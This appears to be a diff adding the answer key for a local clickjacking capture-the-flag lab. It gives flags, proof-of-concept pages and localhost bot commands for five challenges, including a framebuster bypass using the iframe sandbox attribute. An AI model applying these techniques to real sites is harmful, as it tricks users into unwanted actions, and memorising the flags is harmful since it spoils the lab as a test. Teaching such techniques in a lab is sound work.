@@ -1,0 +1,99 @@
+===============================================================================
+  NeonPanel — Clickjacking Lab Solutions (Port 5007)
+===============================================================================
+
+CHALLENGE 1: Basic Clickjacking — Delete Account
+Flag: FLAG{cl1ckj4ck_b4s1c}
+
+  No X-Frame-Options or CSP frame-ancestors headers on any page.
+  The /settings page has a "Delete Account" button.
+
+  Step 1: Visit the POC page to see the attack:
+    http://localhost:5007/poc/1
+
+  Step 2: Use the bot to simulate the victim clicking:
+    curl -X POST http://localhost:5007/bot \
+      -H "Content-Type: application/json" \
+      -d '{"action": "click", "target": "/settings/delete"}'
+
+  When the operator account is deleted, the flag appears.
+  POST /reset to restore state.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Form Hijacking — Credit Transfer
+Flag: FLAG{cl1ckj4ck_f0rm_h1jack}
+
+  The /transfer page is frameable. Attacker overlays a transparent
+  iframe with pre-filled form values.
+
+  Step 1: Visit the POC:
+    http://localhost:5007/poc/2
+
+  Step 2: Use the bot:
+    curl -X POST http://localhost:5007/bot2 \
+      -H "Content-Type: application/json" \
+      -d '{"action": "submit", "target": "/transfer", "data": {"to_user": "1", "amount": "500"}}'
+
+  When credits are transferred, the flag appears.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: Multi-Step Clickjacking — Promote to Admin
+Flag: FLAG{cl1ckj4ck_mult1_st3p}
+
+  The /admin/promote page has a two-step confirmation flow.
+  Both steps are frameable.
+
+  Step 1: Visit the POC:
+    http://localhost:5007/poc/3
+
+  Step 2: Use the bot to complete both steps:
+    curl -X POST http://localhost:5007/bot3 \
+      -H "Content-Type: application/json" \
+      -d '{"action": "multi-click", "steps": ["/admin/promote", "/admin/promote/confirm"]}'
+
+  When operator is promoted to admin, the flag appears.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: Framebuster Bypass — Sandbox Attribute
+Flag: FLAG{cl1ckj4ck_bust3r_byp4ss}
+
+  The /settings-js page has JavaScript framebusting:
+    if (top !== self) { top.location = self.location; }
+
+  Bypass: Use sandbox="allow-forms allow-scripts" on the iframe.
+  This prevents the iframe from navigating the top-level window.
+
+  Step 1: Visit the POC:
+    http://localhost:5007/poc/4
+
+  Step 2: Use the bot:
+    curl -X POST http://localhost:5007/bot4 \
+      -H "Content-Type: application/json" \
+      -d '{"action": "click", "target": "/settings-js/action", "sandbox": true}'
+
+  The sandbox attribute blocks top.location assignment while still
+  allowing form submission.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: Data Exfiltration via Clickjacking
+Flag: FLAG{cl1ckj4ck_d4t4_3xf1l}
+
+  The /export-data page has an "Export All Data" button.
+  No framing protection.
+
+  Step 1: Visit the POC:
+    http://localhost:5007/poc/5
+
+  Step 2: Use the bot:
+    curl -X POST http://localhost:5007/bot5 \
+      -H "Content-Type: application/json" \
+      -d '{"action": "click", "target": "/export-data"}'
+
+  The exported data includes the flag.
+  POST /reset to restore state between attempts.
+
+===============================================================================
